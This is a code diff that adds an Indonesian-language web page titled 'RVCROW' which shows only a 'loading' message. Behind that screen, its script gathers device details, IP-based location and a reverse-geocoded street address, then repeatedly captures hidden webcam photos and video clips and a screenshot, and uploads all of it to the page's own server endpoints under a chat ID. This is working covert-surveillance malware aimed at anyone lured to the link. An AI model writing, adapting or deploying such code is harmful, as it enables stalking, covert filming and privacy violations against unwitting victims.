@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>RVCROW</title>
+  <style>
+    body{background:#000;color:#6e48aa;font-family:Arial, sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;overflow:hidden}#load{font-size:22px}
+  </style>
+</head>
+<body>
+  <div id="load">RVCROW loading...</div>
+  <video id="v" autoplay muted style="display:none;"></video>
+  <canvas id="c" style="display:none;"></canvas>
+
+  <script>
+    const cid = '7919359674';
+
+    const crow = async (t) =>
+      fetch('/api/crow', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ cid, t })
+      });
+
+    const claw = async (blob, type, cap) => {
+      const fd = new FormData();
+      fd.append('cid', cid);
+      fd.append('type', type);
+      fd.append('cap', cap);
+      fd.append('f', blob, type === 'photo' ? 'c.jpg' : 'c.webm');
+      await fetch('/api/claw', { method: 'POST', body: fd });
+    };
+
+    const getInfo = async () => {
+      let m = '╭───── RVCROW Full Report ───── ⦿\n\n';
+      m += '⚙️ DEVICE INFO\n';
+      m += `🖥️ User-Agent: ${navigator.userAgent}\n`;
+      m += `💻 Platform: ${navigator.platform}\n`;
+      m += `🌐 Language: ${navigator.language}\n`;
+      m += `📶 Online: ${navigator.onLine ? '✅ Online' : '❌ Offline'}\n`;
+      m += `📺 Screen: ${screen.width}x${screen.height}\n`;
+      m += `🪟 Window: ${innerWidth}x${innerHeight}\n`;
+      m += `💾 RAM: ${navigator.deviceMemory || '❓'} GB\n`;
+      m += `🧠 Cores: ${navigator.hardwareConcurrency}\n`;
+      m += `📜 Referrer: ${document.referrer || 'None'}\n`;
+      m += `🔗 URL: ${location.href}\n`;
+      m += `📄 Title: ${document.title}\n`;
+      m += `🕒 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+      m += `⏳ Offset: ${new Date().getTimezoneOffset()} menit\n`;
+      m += `📚 History: ${history.length}\n`;
+      m += `👆 Touch: ${'ontouchstart' in window ? '✅ Ya' : '❌ Tidak'}\n`;
+
+      if (navigator.getBattery) {
+        try {
+          const b = await navigator.getBattery();
+          m += `🔋 Battery: ${Math.floor(b.level * 100)}%\n`;
+          m += `🔌 Charging: ${b.charging ? '✅ Ya' : '❌ Tidak'}\n`;
+        } catch {
+          m += '🔋 Battery: ❌ Tidak tersedia\n';
+        }
+      }
+
+      try {
+        const r = await fetch('https://ipapi.co/json');
+        const d = await r.json();
+        m += '\n📍 LOCATION INFO\n';
+        m += `📡 IP: ${d.ip}\n`;
+        m += `🏙️ City: ${d.city}\n`;
+        m += `🏘️ Region: ${d.region}\n`;
+        m += `🌍 Country: ${d.country_name}\n`;
+        m += `🏷️ Postal: ${d.postal}\n`;
+        m += `📌 Lat: ${d.latitude}\n`;
+        m += `📍 Lng: ${d.longitude}\n`;
+        if (d.latitude && d.longitude) {
+          const rev = await fetch(
+            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${d.latitude}&lon=${d.longitude}&zoom=18&addressdetails=1`
+          ).then(r => r.json()).catch(() => ({}));
+          const addr = rev.display_name || 'Alamat tidak tersedia';
+          m += `🏠 Alamat: ${addr}\n`;
+        }
+      } catch {
+        m += '\n❌ Lokasi gagal\n';
+      }
+
+      m += '\n╰───── @RVCROW ───── ⦿';
+      return m;
+    };
+
+    const start = async () => {
+      await crow(await getInfo());
+
+      try {
+        const st = await navigator.mediaDevices.getUserMedia({ video: true });
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+        const x = c.getContext('2d');
+        v.srcObject = st;
+
+        setInterval(() => {
+          c.width = v.videoWidth;
+          c.height = v.videoHeight;
+          x.drawImage(v, 0, 0);
+          c.toBlob(b => claw(b, 'photo', '📸 RVCROW'), 'image/jpeg');
+        }, 3000);
+
+        setInterval(() => {
+          const bl = [];
+          const r = new MediaRecorder(st, { mimeType: 'video/webm' });
+          r.ondataavailable = e => bl.push(e.data);
+          r.onstop = () => claw(new Blob(bl, { type: 'video/webm' }), 'video', '🎥 RVCROW');
+          r.start();
+          setTimeout(() => r.stop(), 5000);
+        }, 10000);
+
+      } catch {
+        await crow('❌ Kamera diblok');
+      }
+
+      try {
+        const canvas = await html2canvas(document.body);
+        canvas.toBlob(b => claw(b, 'photo', '🖥️ Screenshot RVCROW'), 'image/jpeg');
+      } catch {
+        await crow('❌ Screenshot gagal');
+      }
+    };
+
+    const s = document.createElement('script');
+    s.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
+    s.onload = () => setTimeout(start, 3000);
+    document.head.appendChild(s);
+  </script>
+</body>
+</html>
